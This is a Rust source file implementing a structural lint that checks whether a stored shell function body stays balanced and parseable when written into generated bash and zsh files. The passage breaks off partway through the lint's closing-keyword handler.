//! A structural lint for the body of a stored function.
//!
//! `shell::render_entry` writes a function entry's command verbatim between
//! `function NAME {` and its closing `}`, so a body is the one stored value that
//! reaches the generated file as code rather than as a quoted string. A body
//! holding a standalone `}` closes the definition early, and everything after it
//! becomes top-level code that runs when the file is sourced and, inside a scope
//! block, on every `cd`. A body that leaves a brace, a quote, a substitution, a
//! heredoc or an `if` open swallows the rest of the generated file instead,
//! silently dropping every definition that follows it.
//!
//! [`body_problem`] answers one question: placed between `function NAME {` and
//! `}`, does this body leave the shell exactly where it found it? Balance is
//! most of that answer, but not all of it: bash abandons the entire generated
//! file at the first syntax error, so a body that balances and still cannot be
//! parsed (`echo &&`, an `else` with no `if`) costs every later definition and
//! the scope dispatcher with them, on every shell start, silently. The scan
//! therefore also refuses an operator with no command on either side of it, a
//! `then`, `else` or `elif` with no open `if`, a `do` with no loop, a loop with
//! no `do`, a `;;` with no `case` branch to end, and a list that closes or is
//! handed on having held no command at all, as `{ }`, `if true; then fi`,
//! `if then` and `while do` do.
//!
//! It is still a structural scan and not a shell parser, so errors outside that
//! set reach the shell: `echo >`, an `if` that never reaches its `then`, and a
//! `case` branch opened by a `)` with no pattern before it.
//!
//! The two shells do not read the same language, so the scan is asked about one
//! generated file at a time. A body only one of them can carry is stored and
//! left out of the other's file rather than refused: [`body_problem_in`] answers
//! for a single shell and drives the renderer, while [`body_problem`] answers
//! for all of them and is the save-time gate. The bash the scan answers for is
//! version 3, which is what macOS ships and so the oldest a generated file has
//! to survive; the zsh-only spellings it turns away are `|&` and the `;&` and
//! `;|` `case` fall-throughs.
//!
//! The two brace tests are deliberately lopsided, because their failures are
//! not symmetric. A `{` that is not a group but is read as one gives a later `}`
//! something to balance against, and that `}` then escapes, so `{` counts only
//! where the shell would read it as the reserved word. A `}` that is a close but
//! is read as text leaves the escape in place, so `}` counts wherever the more
//! liberal of the two shells would close on it: zsh ends a group at any `}` that
//! ends a word, so `ls -l}` closes the definition even though bash reads it as
//! an argument. Everywhere else ambiguity resolves towards refusing: `$'...'`,
//! whose backslash escapes the scan does not honour; a `#` after a `)`, which it
//! reads as part of a word; a `}` inside a backtick substitution that opened no
//! group of its own, which neither shell closes on; and `foo ( ) { }`, which
//! bash reads as a definition and zsh does not.

use crate::shell::Shell;
use std::collections::VecDeque;

/// Why `shell`'s generated file cannot carry `body` as a function body, or
/// `None` when it can.
///
/// The scan reads what `shell::render_entry` would write, which is the body's
/// lines rejoined: a trailing newline and any carriage returns are gone by the
/// time the shell sees it, and a `}` the scan let through because a `\r` came
/// after it would be a bare `}` in the file.
pub fn body_problem_in(body: &str, shell: Shell) -> Option<String> {
    let rendered = body.lines().collect::<Vec<_>>().join("\n");
    Scan::new(&rendered, shell).run().err()
}

/// Why no generated file can carry `body`, or `None` when at least one can.
///
/// This is the save-time gate. A body only one shell reads, as a `case` using
/// zsh's `;&` fall-through is, is stored and left out of the file that cannot
/// carry it; only a body every shell rejects is refused outright.
pub fn body_problem(body: &str) -> Option<String> {
    let mut problem = None;
    for shell in Shell::all() {
        let found = body_problem_in(body, shell)?;
        problem.get_or_insert(found);
    }
    problem
}

/// An open construct the scan is waiting to see closed.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Ctx {
    /// `{ ... }`, a brace group or a nested function body.
    Brace,
    /// `( ... )`, a subshell or the parentheses of a `case` pattern.
    Paren,
    /// `$( ... )`, whose closing `)` ends part of a word rather than a command.
    CmdSubst,
    /// `(( ... ))` or `$(( ... ))`, where `<<` is a shift and not a heredoc.
    Arith,
    /// `${ ... }`, where the closing brace is part of a word.
    ParamBrace,
    /// `` ` ... ` ``, whose delimiter is the same either end.
    Backtick,
    /// `" ... "`, inside which only the expansions stay live.
    Double,
    /// `if` ... `fi`.
    If,
    /// `case` ... `esac`.
    Case,
    /// `do` ... `done`.
    Do,
}

impl Ctx {
    /// How the construct reads in a message about something found inside it.
    fn describe(self) -> &'static str {
        match self {
            Ctx::Brace => "a '{' group",
            Ctx::Paren => "a '(' group",
            Ctx::CmdSubst => "a '$(' substitution",
            Ctx::Arith => "an arithmetic '(('",
            Ctx::ParamBrace => "a '${' expansion",
            Ctx::Backtick => "a '`' substitution",
            Ctx::Double => "a double quote",
            Ctx::If => "an 'if'",
            Ctx::Case => "a 'case'",
            Ctx::Do => "a 'do'",
        }
    }

    /// The message for reaching the end of the body with this still open.
    fn unterminated(self) -> &'static str {
        match self {
            Ctx::Brace => "a '{' group is never closed by a '}'",
            Ctx::Paren => "a '(' is never closed by a ')'",
            Ctx::CmdSubst => "a '$(' substitution is never closed by a ')'",
            Ctx::Arith => "an arithmetic '((' is never closed by a '))'",
            Ctx::ParamBrace => "a '${' expansion is never closed by a '}'",
            Ctx::Backtick => "a '`' substitution is never closed",
            Ctx::Double => "a double quote is never closed",
            Ctx::If => "an 'if' is never closed by a 'fi'",
            Ctx::Case => "a 'case' is never closed by an 'esac'",
            Ctx::Do => "a 'do' is never closed by a 'done'",
        }
    }
}

const TRAILING_BACKSLASH: &str =
    "the body ends with a backslash, which would escape the newline before the closing '}'";

fn is_blank(c: char) -> bool {
    c == ' ' || c == '\t'
}

/// Whether the character before `i` lets a word start there.
fn starts_word(chars: &[char], i: usize) -> bool {
    match i.checked_sub(1) {
        None => true,
        Some(prev) => {
            is_blank(chars[prev]) || matches!(chars[prev], '\n' | ';' | '&' | '|' | '(' | ')')
        }
    }
}

/// Whether the `#` at `i` starts a comment.
///
/// A `#` only opens one at the start of a word. A `)` before it is ambiguous:
/// it ends a word in `$(date)#x` and ends a subshell in `(true)#x`. Reading it
/// as part of a word keeps a `}` on that line in view, at the price of scanning
/// a rare comment as code.
fn starts_comment(chars: &[char], i: usize) -> bool {
    match i.checked_sub(1) {
        None => true,
        Some(prev) => is_blank(chars[prev]) || matches!(chars[prev], '\n' | ';' | '&' | '|' | '('),
    }
}

/// Whether the character after `i` ends the word that ends at `i`.
fn ends_word(chars: &[char], i: usize) -> bool {
    match chars.get(i + 1) {
        None => true,
        Some(&c) => {
            is_blank(c)
                || matches!(
                    c,
                    '\n' | ';' | '&' | '|' | '(' | ')' | '<' | '>' | '"' | '\'' | '`'
                )
        }
    }
}

/// Whether the word ending at `i` opened a brace of its own earlier that is
/// still unmatched, as `a{b,c}` and the `{}` of `find -exec` do.
///
/// The braces already closed inside the word are counted off, so the second `}`
/// of `echo ${x}}` cannot claim the `{` of the expansion; a `${` is not an open
/// the word can claim at all, because the caller has already taken it off the
/// context stack.
fn word_opened_a_brace(chars: &[char], i: usize) -> bool {
    let mut closed = 0usize;
    for j in (0..i).rev() {
        match chars[j] {
            '}' => closed += 1,
            '{' if closed > 0 => closed -= 1,
            '{' => return j == 0 || chars[j - 1] != '$',
            c if is_blank(c) => return false,
            '\n' | ';' | '&' | '|' | '(' | ')' | '<' | '>' | '"' | '\'' | '`' => return false,
            _ => {}
        }
    }
    false
}

/// Whether the `{` at `i` opens a group rather than being an ordinary word.
///
/// `{` is the reserved word only as the first word of a command and only with a
/// blank after it, so `a{b,c}`, `${x}`, the `{}` of `find -exec` and the literal
/// `{` of `echo {` are all left alone. Recognising one of those as a group would
/// give a later `}` something to balance against, and that `}` is the one that
/// escapes the function.
fn opens_group(chars: &[char], i: usize, cmd_pos: bool) -> bool {
    cmd_pos
        && starts_word(chars, i)
        && match chars.get(i + 1) {
            None => true,
            Some(&c) => is_blank(c) || c == '\n',
        }
}

/// Whether the `}` at `i` closes a group.
///
/// zsh ends a brace group at any `}` that ends a word, so `ls -l}` closes the
/// definition even though bash reads it as an argument. The `}` that does not
/// close is the one the shell reads as part of a brace construct: `${x}`, which
/// the caller takes off the context stack first, and the `a{b,c}` and `{}`
/// forms, where the same word opened the brace.
fn closes_group(chars: &[char], i: usize) -> bool {
    ends_word(chars, i) && !word_opened_a_brace(chars, i)
}

struct Scan {
    chars: Vec<char>,
    i: usize,
    stack: Vec<Ctx>,
    /// Heredocs opened on the line being scanned, in the order their bodies
    /// follow the next newline.
    heredocs: VecDeque<(String, bool)>,
    /// Whether the next word would be parsed as the first word of a command,
    /// which is the only place a reserved word is reserved.
    cmd_pos: bool,
    /// Whether an open `case` is waiting for the pattern of its next branch,
    /// which is a word rather than a command.
    case_pattern: bool,
    /// Whether the last word was `function`, so the name after it is still
    /// followed by the `{` of a definition.
    fn_name: bool,
    /// Whether the character just consumed was backslash-escaped, and so joins
    /// the word around it rather than delimiting it.
    prev_escaped: bool,
    /// An operator that joins two commands and has not been given its second
    /// one yet, as the `&&` of `echo &&` never is.
    dangling: Option<&'static str>,
    /// Whether a command has begun since the last separator, so an operator
    /// arriving now has one on its left. The `&&` of `echo a && ; echo b` does
    /// not.
    prev_command: bool,
    /// Whether a command has appeared anywhere in the list being read, so the
    /// `}`, `)`, `fi` or `done` that closes it is not closing an empty one.
    list_command: bool,
    /// The loop words still waiting for the `do` that opens their body.
    loops: Vec<&'static str>,
    /// Whether the word just consumed was `for` or `select`. What follows one
    /// is a name rather than a command, but a `((` after it is still the
    /// arithmetic form, where `<<` is a shift and not a heredoc.
    arith_header: bool,
    /// The stack depth of the `((` of a `for` header, whose `))` is followed by
    /// the loop's `do` with or without a separator between.
    arith_header_depth: Option<usize>,
    /// The shell whose generated file this body is being scanned for. Almost
    /// every rule is common to both; the `case` fall-through terminators are
    /// the exception.
    shell: Shell,
}

impl Scan {
    fn new(body: &str, shell: Shell) -> Self {
        Scan {
            shell,
            chars: body.chars().collect(),
            i: 0,
            stack: Vec::new(),
            heredocs: VecDeque::new(),
            cmd_pos: true,
            case_pattern: false,
            fn_name: false,
            prev_escaped: false,
            dangling: None,
            prev_command: false,
            list_command: false,
            loops: Vec::new(),
            arith_header: false,
            arith_header_depth: None,
        }
    }

    /// Command position resumes after a separator, unless a `case` is waiting
    /// for its next pattern.
    fn resume_cmd_pos(&mut self) {
        self.cmd_pos = !self.case_pattern;
    }

    /// Note that a command has begun, or that a compound one has just finished.
    fn command_arrived(&mut self) {
        self.prev_command = true;
        self.list_command = true;
    }

    /// Note that a fresh list of commands has begun, so nothing before it can
    /// stand in for the command the list still needs.
    fn list_opened(&mut self) {
        self.prev_command = false;
        self.list_command = false;
    }

    fn run(mut self) -> Result<(), String> {
        while self.i < self.chars.len() {
            if self.stack.last() == Some(&Ctx::Double) {
                self.step_double()?;
            } else {
                self.step_code()?;
            }
        }
        if let Some((delim, _)) = self.heredocs.front() {
            return Err(format!("a heredoc is never closed by a '{delim}' line"));
        }
        if let Some(ctx) = self.stack.last() {
            return Err(ctx.unterminated().to_string());
        }
        if let Some(word) = self.loops.last() {
            return Err(format!("a '{word}' is never followed by a 'do'"));
        }
        self.ensure_command_arrived()?;
        self.ensure_list_filled("the body")
    }

    /// Refuse an operator that was never given the command it joins to. Such a
    /// body balances, but bash abandons the whole generated file on the syntax
    /// error, taking every later definition and the scope dispatcher with it.
    fn ensure_command_arrived(&self) -> Result<(), String> {
        match self.dangling {
            Some(op) => Err(format!("a '{op}' has no command after it")),
            None => Ok(()),
        }
    }

    /// Refuse an operator that has no command on its left, as the `;` of
    /// `echo a && ; echo b` and the leading `|` of `| grep x` do not.
    fn ensure_command_before(&self, op: &str) -> Result<(), String> {
        match self.prev_command {
            true => Ok(()),
            false => Err(format!("a '{op}' has no command before it")),
        }
    }

    /// Refuse a list that closes having held no command at all. `{ }`, `( )`,
    /// `if true; then fi` and a body that is nothing but a comment all balance,
    /// and bash abandons the generated file at each of them.
    fn ensure_list_filled(&self, what: &str) -> Result<(), String> {
        match self.list_command {
            true => Ok(()),
            false => Err(format!("{what} has no command in it")),
        }
    }

    /// Inside a double quote only the expansions stay live; a `}` there is text.
    fn step_double(&mut self) -> Result<(), String> {
        match self.chars[self.i] {
            '\\' => self.escape()?,
            '"' => {
                self.stack.pop();
                self.i += 1;
                self.cmd_pos = false;
            }
            '$' => self.expansion(),
            '`' => {
                self.stack.push(Ctx::Backtick);
                self.i += 1;
                self.cmd_pos = true;
            }
            _ => self.i += 1,
        }
        Ok(())
    }

    fn step_code(&mut self) -> Result<(), String> {
        let escaped = std::mem::take(&mut self.prev_escaped);
        let c = self.chars[self.i];
        // Blanks are all that may sit between a loop word and its `((`.
        let arith_header = self.arith_header;
        if !is_blank(c) {
            self.arith_header = false;
        }
        self.step_one(escaped, arith_header)?;
        // Everything the shell can read as the start of a command satisfies a
        // pending operator. The characters left out here are the ones that
        // cannot: separators, the blanks and comments between, group closers,
        // group openers, whose command is the one inside them, and `!`, which
        // negates the command after it rather than being one.
        if !matches!(
            c,
            ' ' | '\t' | '\n' | ';' | '&' | '|' | '(' | ')' | '{' | '}' | '#' | '!'
        ) {
            self.dangling = None;
        }
        // A word records its own arrival, because a reserved word opens a list
        // rather than filling one, and a group closer records it from inside
        // the close.
        if !(matches!(
            c,
            ' ' | '\t' | '\n' | ';' | '&' | '|' | '(' | ')' | '{' | '}' | '#' | '!'
        ) || c.is_ascii_alphabetic()
            || c == '_')
        {
            self.command_arrived();
        }
        Ok(())
    }

    fn step_one(&mut self, escaped: bool, arith_header: bool) -> Result<(), String> {
        match self.chars[self.i] {
            '\\' => self.escape()?,
            '\'' => self.single_quote()?,
            '"' => {
                self.stack.push(Ctx::Double);
                self.i += 1;
            }
            '`' => {
                if self.stack.last() == Some(&Ctx::Backtick) {
                    self.stack.pop();
                } else {
                    self.stack.push(Ctx::Backtick);
                }
                self.i += 1;
                self.cmd_pos = true;
            }
            '$' => self.expansion(),
            // A `#` inside `${...}` is part of the expansion, and one after an
            // escaped blank is part of the word that blank belongs to.
            '#' if !escaped
                && self.stack.last() != Some(&Ctx::ParamBrace)
                && starts_comment(&self.chars, self.i) =>
            {
                while self.i < self.chars.len() && self.chars[self.i] != '\n' {
                    self.i += 1;
                }
            }
            // A newline ends the command before it as surely as a `;` does, so
            // an operator opening the next line has nothing on its left: both
            // shells abandon the file at `echo a` followed by `| grep x`.
            '\n' => {
                self.i += 1;
                self.resume_cmd_pos();
                self.prev_command = false;
                self.consume_heredocs()?;
            }
            // `;;` and the fall-through forms end a `case` branch, and what
            // follows is the next pattern.
            ';' if self.stack.last() == Some(&Ctx::Case)
                && matches!(self.chars.get(self.i + 1), Some(';' | '&' | '|')) =>
            {
                self.ensure_command_arrived()?;
                self.case_terminator()?;
            }
            ';' | '&' | '|' => self.separator()?,
            // A redirection stays inside the command it belongs to, so the `&`
            // of `2>&1` or `>& log` is not a separator and what follows it is
            // not a command.
            '>' => {
                self.i += 1;
                if self.chars.get(self.i) == Some(&'>') {
                    self.i += 1;
                }
                if self.chars.get(self.i) == Some(&'&') {
                    self.i += 1;
                }
                self.cmd_pos = false;
            }
            // Blanks separate words without ending the command, so they leave
            // command position exactly as they found it.
            c if is_blank(c) => self.i += 1,
            '(' => {
                if (self.cmd_pos || arith_header) && self.chars.get(self.i + 1) == Some(&'(') {
                    if arith_header {
                        self.arith_header_depth = Some(self.stack.len());
                    }
                    self.stack.push(Ctx::Arith);
                    self.i += 2;
                    self.cmd_pos = true;
                    self.list_opened();
                } else {
                    // `(a|b)` is a `case` pattern list rather than a subshell,
                    // and what is inside it is a word rather than a command.
                    let pattern = self.case_pattern && self.stack.last() == Some(&Ctx::Case);
                    let subshell = self.cmd_pos && !pattern;
                    self.stack.push(Ctx::Paren);
                    self.i += 1;
                    self.cmd_pos = !pattern;
                    self.list_opened();
                    // Only a `(` in command position holds commands. The one of
                    // `arr=()`, of a process substitution operand and of a
                    // pattern list holds words, and both shells read an empty
                    // one of those.
                    self.list_command = !subshell;
                }
            }
            ')' => self.close_paren()?,
            // `!` negates the command after it, which is still a command.
            '!' if self.cmd_pos => self.i += 1,
            '{' => {
                if opens_group(&self.chars, self.i, self.cmd_pos) {
                    self.stack.push(Ctx::Brace);
                    self.cmd_pos = true;
                    self.list_opened();
                } else {
                    self.cmd_pos = false;
                }
                self.i += 1;
            }
            '}' => self.close_brace()?,
            '<' => self.redirect()?,
            c if c.is_ascii_alphabetic() || c == '_' => self.word()?,
            _ => {
                self.i += 1;
                self.cmd_pos = false;
            }
        }
        Ok(())
    }

    /// Consume the operator that ends a `case` branch.
    ///
    /// Only `;;` is read by both shells. `;&` and `;|` are zsh's fall-throughs,
    /// which every bash rejects; `;;&` needs bash 4, which zsh rejects and which
    /// the bash macOS ships is too old for, so it is refused everywhere. A
    /// rejected one is not a branch that misbehaves, it is a syntax error that
    /// costs the whole generated file, so the shell that cannot read it does not
    /// get the entry at all.
    fn case_terminator(&mut self) -> Result<(), String> {
        let op = self.operator_run();
        // A branch ends at a `)`, which leaves pattern position. Still being in
        // it means there is no branch here to end, as in `case $1 in ;; esac`.
        if self.case_pattern {
            return Err(format!("a '{op}' has no 'case' branch to end"));
        }
        self.i += op.chars().count();
        match op.as_str() {
            ";;" => {}
            ";&" | ";|" if self.shell == Shell::Zsh => {}
            ";&" | ";|" => {
                return Err(format!(
                    "a '{op}' case fall-through, which zsh reads and bash does not"
                ));
            }
            ";;&" => {
                return Err(
                    "a ';;&' case fall-through, which zsh rejects and bash needs version 4 for"
                        .into(),
                );
            }
            other => return Err(format!("a '{other}' has no meaning after a case branch")),
        }
        self.case_pattern = true;
        self.cmd_pos = false;
        self.list_opened();
        Ok(())
    }

    /// The run of `;`, `&` and `|` at the cursor, which is how a `case` branch
    /// terminator and the shapes mistaken for one are spelled.
    fn operator_run(&self) -> String {
        self.chars[self.i..]
            .iter()
            .take_while(|c| matches!(c, ';' | '&' | '|'))
            .collect()
    }

    /// Consume a separator or a control operator. `;` and a backgrounding `&`
    /// end a command; `&&`, `||`, `|` and `|&` join it to another one, which
    /// then has to arrive.
    fn separator(&mut self) -> Result<(), String> {
        let c = self.chars[self.i];
        let next = self.chars.get(self.i + 1).copied();
        // Inside arithmetic these are operators rather than separators: the
        // sections of `for ((;;))` are allowed to be empty and the `&&` of
        // `(( a && b ))` joins values rather than commands.
        if self.stack.last() == Some(&Ctx::Arith) {
            self.i += 1;
            return Ok(());
        }
        // The `case` arm above took every terminator that ends a branch, so one
        // here either sits inside a construct the branch left open or has no
        // branch at all. `;&` and `;|` are branch terminators to zsh and
        // nothing to bash, so both shells abandon the file over one out here.
        if c == ';' && matches!(next, Some(';' | '&' | '|')) {
            let op = self.operator_run();
            return match self.stack.last() {
                Some(open) if self.stack.contains(&Ctx::Case) => Err(format!(
                    "a '{op}' arrives while {} is still open",
                    open.describe()
                )),
                _ => Err(format!("a '{op}' has no 'case' branch to end")),
            };
        }
        let spelled: String = match (c, next) {
            ('&', Some('&')) => "&&".into(),
            ('|', Some('|')) => "||".into(),
            ('|', Some('&')) => "|&".into(),
            _ => c.to_string(),
        };
        self.ensure_command_before(&spelled)?;
        self.i += 1;
        let op = match (c, next) {
            ('&', Some('&')) => Some("&&"),
            ('|', Some('|')) => Some("||"),
            ('|', Some('&')) => Some("|&"),
            ('|', _) => Some("|"),
            _ => None,
        };
        if let Some(op) = op {
            if op != "|" {
                self.i += 1;
            }
            // `|&` is zsh's shorthand for `2>&1 |` and bash 3, the version
            // macOS ships, has no spelling for it. Like the `case`
            // fall-throughs it is a syntax error rather than a misreading, so
            // the shell that cannot parse it does not get the entry.
            if op == "|&" && self.shell == Shell::Bash {
                return Err("a '|&' pipe, which zsh reads and bash does not".into());
            }
            self.dangling = Some(op);
        }
        self.resume_cmd_pos();
        self.prev_command = false;
        Ok(())
    }

    fn escape(&mut self) -> Result<(), String> {
        if self.i + 1 >= self.chars.len() {
            return Err(TRAILING_BACKSLASH.into());
        }
        self.i += 2;
        self.prev_escaped = true;
        Ok(())
    }

    fn single_quote(&mut self) -> Result<(), String> {
        self.i += 1;
        while let Some(&c) = self.chars.get(self.i) {
            self.i += 1;
            if c == '\'' {
                self.cmd_pos = false;
                return Ok(());
            }
        }
        Err("a single quote is never closed".into())
    }

    fn expansion(&mut self) {
        match self.chars.get(self.i + 1) {
            Some('(') if self.chars.get(self.i + 2) == Some(&'(') => {
                self.stack.push(Ctx::Arith);
                self.i += 3;
            }
            Some('(') => {
                self.stack.push(Ctx::CmdSubst);
                self.i += 2;
                self.cmd_pos = true;
            }
            Some('{') => {
                self.stack.push(Ctx::ParamBrace);
                self.i += 2;
            }
            _ => self.i += 1,
        }
    }

    fn close_paren(&mut self) -> Result<(), String> {
        self.ensure_command_arrived()?;
        match self.stack.last() {
            Some(Ctx::Arith) if self.chars.get(self.i + 1) == Some(&')') => {
                self.stack.pop();
                self.i += 2;
                // The `((...))` of a `for` header is followed by the loop's
                // `do`, with or without a separator between; every other one is
                // an expression, and a `do` after it is a syntax error to bash.
                let header = self.arith_header_depth == Some(self.stack.len());
                if header {
                    self.arith_header_depth = None;
                }
                self.cmd_pos = header;
                self.command_arrived();
            }
            // A lone `)` means the `((` was two nested subshells rather than
            // arithmetic, as in `((cmd) | cmd)`. One of the two closes here.
            Some(Ctx::Arith) => {
                *self.stack.last_mut().unwrap() = Ctx::Paren;
                self.arith_header_depth = None;
                self.i += 1;
                self.cmd_pos = false;
                self.command_arrived();
            }
            Some(Ctx::CmdSubst) => {
                self.stack.pop();
                self.i += 1;
                self.cmd_pos = false;
                self.command_arrived();
            }
            Some(Ctx::Paren) => {
                self.ensure_list_filled("a '(' group")?;
                self.stack.pop();
                self.i += 1;
                // `(a)` is the other way to write a `case` pattern.
                let pattern = self.case_pattern && self.stack.last() == Some(&Ctx::Case);
                self.cmd_pos = pattern;
                self.case_pattern = false;
                // A finished pattern list opens the branch body; a finished
                // subshell is itself a command.
                if pattern {
                    self.list_opened();
                } else {
                    self.command_arrived();
                }
            }
            // With a `case` open and no group of its own, a `)` terminates a
            // pattern: `a|b) ...`.
            Some(Ctx::Case) => {
                self.i += 1;
                self.case_pattern = false;
                self.cmd_pos = true;
                self.list_opened();
            }
            _ => return Err("a ')' has no matching '('".into()),
        }
        Ok(())
    }

    fn close_brace(&mut self) -> Result<(), String> {
        if self.stack.last() == Some(&Ctx::ParamBrace) {
            self.stack.pop();
            self.i += 1;
            self.cmd_pos = false;
            return Ok(());
        }
        if !closes_group(&self.chars, self.i) {
            self.i += 1;
            self.cmd_pos = false;
            return Ok(());
        }
        match self.stack.last() {
            // `{ echo a }` is a closed group in zsh and an unclosed one in
            // bash, whose `}` is an argument and which then swallows the
            // generated closing `}` and the rest of the file. Neither shell can
            // be followed here, so the body has to say which it means.
            Some(Ctx::Brace) if !self.cmd_pos => Err(
                "a '}' with no ';' or newline before it: zsh closes the group here, bash reads it as an argument"
                    .into(),
            ),
            Some(Ctx::Brace) => {
                self.ensure_command_arrived()?;
                self.ensure_list_filled("a '{' group")?;
                self.stack.pop();
                self.i += 1;
                self.cmd_pos = true;
                self.command_arrived();
                Ok(())
            }
            Some(other) => Err(format!(
                "a '}}' arrives while {} is still open",
                other.describe()
            )),
            None => Err(
                "a '}' here closes the function early: quote it if the body means a literal '}'"
                    .into(),
            ),
        }
    }

    /// Handle a `<`. Only `<<` matters, and only outside arithmetic, where the
    /// same two characters are a left shift. `<<<` is a herestring, whose
    /// operand is an ordinary word and not a delimiter, so it is stepped over
    /// whole rather than left for the `<<` case to misread.
    fn redirect(&mut self) -> Result<(), String> {
        let run = self.chars[self.i..]
            .iter()
            .take_while(|&&c| c == '<')
            .count();
        let heredoc = run == 2 && self.stack.last() != Some(&Ctx::Arith);
        if !heredoc {
            self.i += run;
            if self.chars.get(self.i) == Some(&'&') {
                self.i += 1;
            }
            self.cmd_pos = false;
            return Ok(());
        }
        self.i += 2;
        let strip = self.chars.get(self.i) == Some(&'-');
        if strip {
            self.i += 1;
        }
        while matches!(self.chars.get(self.i), Some(&c) if is_blank(c)) {
            self.i += 1;
        }
        let delim = self.heredoc_delimiter()?;
        self.heredocs.push_back((delim, strip));
        self.cmd_pos = false;
        Ok(())
    }

    /// Read the delimiter word after a `<<`, dropping the quoting the shell
    /// drops so the terminator line can be compared against it literally.
    ///
    /// A `}` that ends the delimiter ends the word with it, and zsh closes the
    /// group there, so it is left for [`Scan::close_brace`]; a `}` inside the
    /// delimiter, as in `<<E}F`, is part of it in both shells.
    fn heredoc_delimiter(&mut self) -> Result<String, String> {
        let mut out = String::new();
        while let Some(&c) = self.chars.get(self.i) {
            match c {
                '}' if ends_word(&self.chars, self.i) => break,
                ' ' | '\t' | '\n' | ';' | '&' | '|' | '(' | ')' | '<' | '>' | '`' => break,
                '\'' | '"' => {
                    self.i += 1;
                    let mut closed = false;
                    while let Some(&q) = self.chars.get(self.i) {
                        self.i += 1;
                        if q == c {
                            closed = true;
                            break;
                        }
                        out.push(q);
                    }
                    if !closed {
                        return Err("a quote in a heredoc delimiter is never closed".into());
                    }
                }
                '\\' => {
                    self.i += 1;
                    match self.chars.get(self.i) {
                        Some(&escaped) => {
                            out.push(escaped);
                            self.i += 1;
                        }
                        None => return Err(TRAILING_BACKSLASH.into()),
                    }
                }
                _ => {
                    out.push(c);
                    self.i += 1;
                }
            }
        }
        if out.is_empty() {
            return Err("a heredoc '<<' has no delimiter word".into());
        }
        Ok(out)
    }

    /// Skip the bodies of the heredocs opened on the line just ended. Their
    /// content is text, so a `}` on a line of its own inside one is harmless.
    fn consume_heredocs(&mut self) -> Result<(), String> {
        if self.heredocs.is_empty() {
            return Ok(());
        }
        while let Some((delim, strip)) = self.heredocs.pop_front() {
            loop {
                if self.i >= self.chars.len() {
                    return Err(format!("a heredoc is never closed by a '{delim}' line"));
                }
                let start = self.i;
                while self.i < self.chars.len() && self.chars[self.i] != '\n' {
                    self.i += 1;
                }
                let line: String = self.chars[start..self.i].iter().collect();
                if self.i < self.chars.len() {
                    self.i += 1;
                }
                let candidate = if strip {
                    line.trim_start_matches('\t')
                } else {
                    line.as_str()
                };
                if candidate == delim {
                    break;
                }
            }
        }
        self.resume_cmd_pos();
        Ok(())
    }

    /// Consume a bare word, tracking the reserved words that open and close a
    /// construct. A reserved word only counts as the first word of a command,
    /// so `echo fi` is an argument.
    fn word(&mut self) -> Result<(), String> {
        let start = self.i;
        while matches!(self.chars.get(self.i), Some(&c) if c.is_ascii_alphanumeric() || c == '_') {
            self.i += 1;
        }
        // A quote does not end the word here, because `fi"x"` is the single word
        // `fix` rather than the reserved word; a backtick does, because it can
        // only be the end of the substitution the word sits in.
        let bare = match self.chars.get(self.i) {
            None => true,
            Some(&c) => {
                is_blank(c) || matches!(c, '\n' | ';' | '&' | '|' | '(' | ')' | '<' | '>' | '`')
            }
        };
        let word: String = self.chars[start..self.i].iter().collect();
        // `esac` is the one reserved word that arrives where a pattern would.
        if bare && self.case_pattern && self.stack.last() == Some(&Ctx::Case) && word == "esac" {
            return self.close(Ctx::Case, "esac", "case");
        }
        if !(self.cmd_pos && bare) {
            self.cmd_pos = false;
            self.command_arrived();
            return Ok(());
        }
        // `function f {` and `function f() {` are the same definition, so the
        // parentheses are stepped over whether or not they are there.
        if std::mem::take(&mut self.fn_name) {
            self.take_definition_parens(true);
            self.cmd_pos = true;
            self.list_opened();
            return Ok(());
        }
        match word.as_str() {
            "function" => {
                self.fn_name = true;
                self.cmd_pos = true;
                self.list_opened();
            }
            "if" => {
                self.stack.push(Ctx::If);
                self.cmd_pos = true;
                self.list_opened();
            }
            // A loop word claims the `do` that opens its body, so an orphan
            // `do` and a loop that never reaches one are both refused.
            "while" | "until" => {
                self.loops
                    .push(if word == "while" { "while" } else { "until" });
                self.cmd_pos = true;
                self.list_opened();
            }
            "for" | "select" => {
                self.loops
                    .push(if word == "for" { "for" } else { "select" });
                self.cmd_pos = false;
                self.arith_header = true;
                self.list_opened();
            }
            "do" => match self.loops.pop() {
                Some(loop_word) => {
                    self.ensure_list_filled(&format!("the '{loop_word}' header"))?;
                    self.stack.push(Ctx::Do);
                    self.cmd_pos = true;
                    self.list_opened();
                }
                None => return Err("a 'do' has no loop before it to open".into()),
            },
            // What follows `case` is the word being matched, not a command, so
            // a pattern named after a reserved word stays a pattern.
            "case" => {
                self.stack.push(Ctx::Case);
                self.case_pattern = true;
                self.cmd_pos = false;
                self.list_opened();
            }
            "fi" => self.close(Ctx::If, "fi", "if")?,
            "done" => self.close(Ctx::Do, "done", "do")?,
            "esac" => self.close(Ctx::Case, "esac", "case")?,
            // These belong to an `if` and to nothing else, so one that arrives
            // without an open `if` is a syntax error the shell would abort on.
            "then" | "else" | "elif" => {
                if self.stack.last() != Some(&Ctx::If) {
                    return Err(format!("'{word}' has no matching 'if'"));
                }
                // `if then` and `elif then` leave the condition empty, which
                // bash abandons the file over.
                if word == "then" {
                    self.ensure_list_filled("the 'if' condition")?;
                }
                self.cmd_pos = true;
                self.list_opened();
            }
            "time" => {
                self.cmd_pos = true;
                self.list_opened();
            }
            // A name followed by `()` is a definition, whose `{` still opens a
            // group; any other word puts the rest of its command out of
            // command position.
            _ => {
                self.cmd_pos = self.take_definition_parens(false);
                self.command_arrived();
            }
        }
        Ok(())
    }

    /// Step over the `()` of a `name() { ... }` definition, reporting whether
    /// it was there.
    ///
    /// `inner_blanks` says whether a blank may sit between the two parentheses.
    /// After the `function` keyword zsh reads `f ( ) { }` as a definition; on
    /// the bare-name form it does not, and reading it as one there would hand
    /// the following `}` a phantom group to balance against and let it close
    /// the generated definition early.
    fn take_definition_parens(&mut self, inner_blanks: bool) -> bool {
        let mut j = self.i;
        while matches!(self.chars.get(j), Some(&c) if is_blank(c)) {
            j += 1;
        }
        if self.chars.get(j) != Some(&'(') {
            return false;
        }
        j += 1;
        while inner_blanks && matches!(self.chars.get(j), Some(&c) if is_blank(c)) {
            j += 1;
        }
        if self.chars.get(j) != Some(&')') {
            return false;
        }
        self.i = j + 1;
        true
    }

    /// Close `want` with the reserved `word` that ends it, `opener` being the
    /// word that would have had to open it.
    fn close(&mut self, want: Ctx, word: &str, opener: &str) -> Result<(), String> {
        self.ensure_command_arrived()?;
        match self.stack.last() {
